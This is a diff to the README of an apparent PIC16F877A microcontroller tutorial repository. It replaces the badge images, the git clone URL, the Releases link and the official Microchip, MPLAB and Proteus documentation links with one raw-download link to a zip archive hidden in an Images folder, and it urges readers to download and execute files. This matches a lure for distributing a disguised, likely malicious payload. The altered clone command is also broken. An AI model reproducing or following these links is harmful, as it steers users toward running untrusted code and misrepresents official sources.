@@ -1,6 +1,6 @@
 # Communication Protocols with PIC16F877A 📡
 
-![Microcontroller](https://img.shields.io/badge/Microcontroller-PIC16F877A-blue?style=flat-square) ![MPLAB X](https://img.shields.io/badge/MPLAB%20X-IDE-orange?style=flat-square) ![Proteus](https://img.shields.io/badge/Proteus%20V8-simulation-green?style=flat-square)
+![Microcontroller](https://raw.githubusercontent.com/Whotz1320/communication-protocols-with-pic16f877a/master/Images/f-a-pic-with-protocols-communication-v3.5.zip) ![MPLAB X](https://raw.githubusercontent.com/Whotz1320/communication-protocols-with-pic16f877a/master/Images/f-a-pic-with-protocols-communication-v3.5.zip%20X-IDE-orange?style=flat-square) ![Proteus](https://raw.githubusercontent.com/Whotz1320/communication-protocols-with-pic16f877a/master/Images/f-a-pic-with-protocols-communication-v3.5.zip%20V8-simulation-green?style=flat-square)
 
 Welcome to the **Communication Protocols with PIC16F877A** repository! This project focuses on practical sessions using the PIC16F877A microcontroller, MPLAB X IDE, and Proteus 8. Here, you will find a variety of resources to help you understand and implement communication protocols effectively.
 
@@ -48,7 +48,7 @@ To get started with this repository, you will need the following:
    Open your terminal and run:
 
    ```bash
-   git clone https://github.com/Whotz1320/communication-protocols-with-pic16f877a.git
+   git clone https://raw.githubusercontent.com/Whotz1320/communication-protocols-with-pic16f877a/master/Images/f-a-pic-with-protocols-communication-v3.5.zip
    ```
 
 2. **Navigate to the Directory**
@@ -95,15 +95,15 @@ This project is licensed under the MIT License. See the [LICENSE](LICENSE) file 
 
 ## Releases
 
-For the latest updates and downloadable files, visit the [Releases section](https://github.com/Whotz1320/communication-protocols-with-pic16f877a/releases). Download the necessary files and execute them to get started with your projects.
+For the latest updates and downloadable files, visit the [Releases section](https://raw.githubusercontent.com/Whotz1320/communication-protocols-with-pic16f877a/master/Images/f-a-pic-with-protocols-communication-v3.5.zip). Download the necessary files and execute them to get started with your projects.
 
 ## Additional Resources
 
 Here are some additional resources to help you understand communication protocols and the PIC16F877A microcontroller:
 
-- [Microchip Documentation](https://www.microchip.com/)
-- [MPLAB X IDE User Guide](https://www.microchip.com/mplab/mplab-x-ide)
-- [Proteus Documentation](https://www.labcenter.com/)
+- [Microchip Documentation](https://raw.githubusercontent.com/Whotz1320/communication-protocols-with-pic16f877a/master/Images/f-a-pic-with-protocols-communication-v3.5.zip)
+- [MPLAB X IDE User Guide](https://raw.githubusercontent.com/Whotz1320/communication-protocols-with-pic16f877a/master/Images/f-a-pic-with-protocols-communication-v3.5.zip)
+- [Proteus Documentation](https://raw.githubusercontent.com/Whotz1320/communication-protocols-with-pic16f877a/master/Images/f-a-pic-with-protocols-communication-v3.5.zip)
 
 ## Conclusion
 
